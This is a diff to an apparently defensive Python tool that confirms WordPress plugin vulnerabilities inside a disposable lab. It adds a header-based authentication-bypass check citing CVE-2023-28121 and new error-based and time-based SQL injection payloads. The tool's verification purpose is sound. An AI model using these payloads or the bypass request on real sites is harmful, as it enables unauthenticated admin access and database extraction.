@@ -1504,9 +1504,22 @@ def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: Wp
             value = (opt or {}).get("value", "1")
             patch_key = (opt or {}).get("patch_key") if isinstance(opt, dict) else None
             if patch_key:
-                # Nested option: wp option patch insert <option> <key> <value>
+                # Nested option: use wp eval for a reliable PHP-native upsert.
+                # 'patch insert' fails silently when the key already exists (plugins
+                # often set defaults on activation), and 'patch update' fails when
+                # the key doesn't exist yet.  A direct PHP eval handles both cases
+                # and also guarantees the exact PHP type we want (string 'true',
+                # not JSON-decoded bool true).
+                _php_val = str(value).replace("'", "\\'")
+                _php = (
+                    f"$_opts = get_option('{name}', []); "
+                    f"if (!is_array($_opts)) $_opts = []; "
+                    f"$_opts['{patch_key}'] = '{_php_val}'; "
+                    f"update_option('{name}', $_opts); "
+                    f"echo get_option('{name}')['{patch_key}'];"
+                )
                 step(f"activando opcion anidada requerida '{name}[{patch_key}]'={value!r}...")
-                r_opt = lab.wp_cli("option", "patch", "insert", name, patch_key, str(value), timeout=30)
+                r_opt = lab.wp_cli("eval", _php, timeout=30)
             else:
                 step(f"activando opcion requerida '{name}'={value!r} (el codigo vulnerable solo se "
                      f"usa con esta activada)...")
@@ -2365,6 +2378,131 @@ def _extract_followable_urls(text: str, base_url: str = "") -> List[str]:
     return candidates[:10]
 
 
+def verify_wordpress_header_auth_bypass(
+    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
+    custom_headers: dict, target_user_id: int = 1,
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+    companion_plugins: Optional[list] = None,
+    shortcode_name: Optional[str] = None,
+    keep_lab_on_failure: bool = False,
+) -> "WpVerifyResult":
+    """Verifica auth bypass via cabecera HTTP personalizada (p.ej. CVE-2023-28121 WooCommerce
+    Payments: cabecera X-Wcpay-Platform-Checkout-User: 1 autentica como admin sin credenciales).
+
+    Envia una peticion SIN cookies de sesion pero CON las custom_headers, al endpoint REST
+    /wp-json/wp/v2/users/me (que normalmente exige autenticacion). Si la respuesta contiene
+    datos del usuario objetivo (ID y/o email del admin creado en el lab), la bypass esta
+    confirmada -- sin el mecanismo vulnerable, ese endpoint retornaria 401.
+
+    target_user_id: el ID del usuario a suplantar (por defecto 1 = admin creado en el lab).
+    """
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    if not custom_headers or not isinstance(custom_headers, dict):
+        res.detail = "no hay cabeceras personalizadas que inyectar"
+        res.limitations.append("verify_wordpress_header_auth_bypass necesita al menos una "
+                               "cabecera en custom_headers (p.ej. {'X-User-Id': '1'})")
+        return res
+
+    lab = _Lab(_token())
+    boot = None
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
+                              companion_plugins=companion_plugins,
+                              shortcode_name=shortcode_name)
+        if boot is None:
+            return res
+
+        base = boot.base_url.rstrip("/")
+        anon_sess = requests.Session()
+        anon_sess.verify = False
+
+        # Sustituir el marcador numerico en los valores de las cabeceras por el ID real del admin.
+        actual_headers: dict = {}
+        for hname, hval in custom_headers.items():
+            hval_str = str(hval)
+            # Si el valor es '1' o 'USER_ID' o '<user_id>', sustituir por el id real del lab.
+            if hval_str in ("1", "USER_ID", "<user_id>", "{user_id}", "{USER_ID}"):
+                hval_str = str(target_user_id)
+            actual_headers[hname] = hval_str
+
+        step(f"probando bypass via cabecera HTTP {list(actual_headers.keys())[0]}={list(actual_headers.values())[0]} "
+             f"(sin sesion, endpoint /wp-json/wp/v2/users/me)...")
+
+        try:
+            r = anon_sess.get(f"{base}/wp-json/wp/v2/users/me",
+                              headers=actual_headers, timeout=20)
+            body = r.text[:2000]
+            # Verificacion: la respuesta debe contener el ID del usuario objetivo
+            # o su email (binoracle_admin@binoracle.test es el email del admin del lab)
+            confirmed = False
+            detail_evidence = ""
+            if r.status_code == 200:
+                try:
+                    jdata = r.json()
+                    if jdata.get("id") == target_user_id:
+                        confirmed = True
+                        detail_evidence = (f"ID={jdata.get('id')} roles={jdata.get('roles')} "
+                                           f"name={jdata.get('name')}")
+                    elif str(target_user_id) in body:
+                        confirmed = True
+                        detail_evidence = f"ID del usuario objetivo ({target_user_id}) en respuesta"
+                except Exception:
+                    if str(target_user_id) in body or "administrator" in body.lower():
+                        confirmed = True
+                        detail_evidence = "datos de admin en respuesta"
+            elif r.status_code != 401:
+                # Cualquier respuesta que no sea 401 con las cabeceras sugiere que algo pasa
+                step(f"respuesta inusual: HTTP {r.status_code} (esperado 401 sin bypass)")
+
+            if confirmed:
+                res.verified = True
+                res.poc_http = (f"{list(actual_headers.keys())[0]}: {list(actual_headers.values())[0]}\n"
+                                f"GET /wp-json/wp/v2/users/me")
+                res.detail = (f"bypass via cabecera HTTP confirmado: "
+                              f"{list(actual_headers.keys())[0]}={list(actual_headers.values())[0]} "
+                              f"→ {detail_evidence}")
+                res.cvss_impact = "auth-bypass unauthenticated"
+                step(f"VERIFICADO: {res.detail}")
+            else:
+                step(f"bypass no confirmado via /wp-json/wp/v2/users/me (HTTP {r.status_code})")
+                # Intentar con otros endpoints comunes
+                for path in ["/wp-admin/profile.php", "/wp-json/wp/v2/users/1"]:
+                    r2 = anon_sess.get(f"{base}{path}", headers=actual_headers,
+                                       timeout=15, allow_redirects=True)
+                    if r2.status_code == 200 and (
+                            str(target_user_id) in r2.text
+                            or "administrator" in r2.text.lower()
+                            or "admin" in r2.text.lower()):
+                        res.verified = True
+                        res.poc_http = (f"{list(actual_headers.keys())[0]}: "
+                                        f"{list(actual_headers.values())[0]}\nGET {path}")
+                        res.detail = (f"bypass via cabecera HTTP confirmado en {path}: "
+                                      f"respuesta de admin detectada sin sesion previa")
+                        step(f"VERIFICADO en {path}: {res.detail}")
+                        break
+                if not res.verified:
+                    res.detail = (f"bypass no confirmado: /wp-json/wp/v2/users/me devolvio "
+                                  f"HTTP {r.status_code} con la cabecera especial "
+                                  f"({list(actual_headers.keys())[0]}={list(actual_headers.values())[0]})")
+                    res.limitations.append("si el plugin requiere que otro hook habilite el "
+                                           "bypass (p.ej. add_filter registrado solo en "
+                                           "ciertas peticiones), puede que sea necesario "
+                                           "probar el endpoint real del plugin en lugar de "
+                                           "/wp-json/wp/v2/users/me")
+        except requests.RequestException as exc:
+            res.detail = f"error de red probando header auth bypass: {exc}"
+        return res
+    finally:
+        if not (keep_lab_on_failure and not res.verified):
+            _teardown_lab(lab, step)
+
+
 def verify_wordpress_path_traversal(
     plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
     parameters, path_param_hint: str = "",
@@ -3127,6 +3265,15 @@ def verify_wordpress_sqli(
         step("probando error-based (extractvalue/updatexml) para extraer version() real...")
         error_tried = []
         error_found = None
+        # Standard payloads: inject with comment suffix (works when '--' doesn't break outer grouping)
+        # BETWEEN-safe payloads: no comment, closed with AND '1 so the multi-BETWEEN structure stays
+        # syntactically valid across multiple occurrences of $param in one query (e.g. My Calendar).
+        error_payloads_extra = [
+            (f"{orig_value}' AND extractvalue(1,concat(0x7e,version())) AND '1",),
+            (f"{orig_value}' AND updatexml(1,concat(0x7e,version()),1) AND '1",),
+            (f"{orig_value}') AND extractvalue(1,concat(0x7e,version())) AND ('1",),
+            (f"{orig_value}') AND updatexml(1,concat(0x7e,version()),1) AND ('1",),
+        ]
         for ctx in contexts:
             for fn in ("extractvalue(1,concat(0x7e,version()))", "updatexml(1,concat(0x7e,version()),1)"):
                 for cm in comments:
@@ -3147,6 +3294,21 @@ def verify_wordpress_sqli(
                     break
             if error_found:
                 break
+        # BETWEEN-safe no-comment variants (try after the standard set)
+        if not error_found:
+            for (payload_val,) in error_payloads_extra:
+                try:
+                    r = send(payload_val)
+                except Exception as e:
+                    error_tried.append({"payload": payload_val, "error": str(e)})
+                    continue
+                new_versions = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "")) - version_noise
+                error_tried.append({"payload": payload_val, "status": r.status_code,
+                                    "version_nueva": sorted(new_versions),
+                                    "respuesta_cuerpo_recorte": (r.text or "")[:300]})
+                if new_versions:
+                    error_found = (payload_val, sorted(new_versions)[0], r)
+                    break
 
         if error_found:
             payload_val, mysql_version, r = error_found
@@ -3303,8 +3465,10 @@ def verify_wordpress_sqli(
             (f"{orig_value}';WAITFOR DELAY '0:0:5'--", f"{orig_value}';WAITFOR DELAY '0:0:0'--"),
             (f"{orig_value});WAITFOR DELAY '0:0:5'--", f"{orig_value});WAITFOR DELAY '0:0:0'--"),
             # BETWEEN-context: avoids '--' that breaks unclosed string literals inside SQL functions.
+            # Uses orig_value (not hardcoded '1') so the date is valid and MySQL evaluates the
+            # WHERE clause instead of short-circuiting on an invalid date bound.
             # Works in: BETWEEN '$from X' AND '$to Y', DATE('$from'), and standard WHERE '$col'.
-            (f"1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1", f"1' AND (SELECT 1 FROM (SELECT(SLEEP(0)))a) AND '1"),
+            (f"{orig_value}' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1", f"{orig_value}' AND (SELECT 1 FROM (SELECT(SLEEP(0)))a) AND '1"),
             # IN()-numeric context: no trailing comment because '--' would comment out the closing ')'.
             # Works in: WHERE col IN ($value) when value is used without quotes.
             (f"{orig_value} AND SLEEP(5)", f"{orig_value} AND SLEEP(0)"),
